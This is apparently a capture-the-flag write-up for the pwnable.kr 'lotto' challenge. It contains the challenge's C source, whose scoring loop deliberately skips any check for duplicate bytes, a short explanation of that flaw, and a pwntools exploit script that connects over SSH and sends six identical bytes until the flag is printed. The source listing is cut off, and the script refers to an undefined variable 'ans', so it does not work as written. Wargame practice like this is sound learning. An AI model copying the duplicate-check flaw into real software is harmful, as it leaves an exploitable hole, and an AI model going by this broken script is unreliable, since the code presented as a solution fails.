lotto
@pwnable:~$ cat lotto.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }


if you input the same number 6 times and it is one of the 6 numbers then
you win:

sorry mom... I FORGOT to check duplicate numbers... :(


from pwn import *

terminal = ssh('lotto', 'pwnable.kr', password='guest', port=2222)



p = terminal.process('./lotto')


for i in range(10):


	p.sendline('1')

	p.sendline(b'\x12'*6)
	response = p.recvuntil('bad luck',timeout=2)
	print('ans is',ans)
	if b"bad luck" not in ans:
		p.interactive()
		break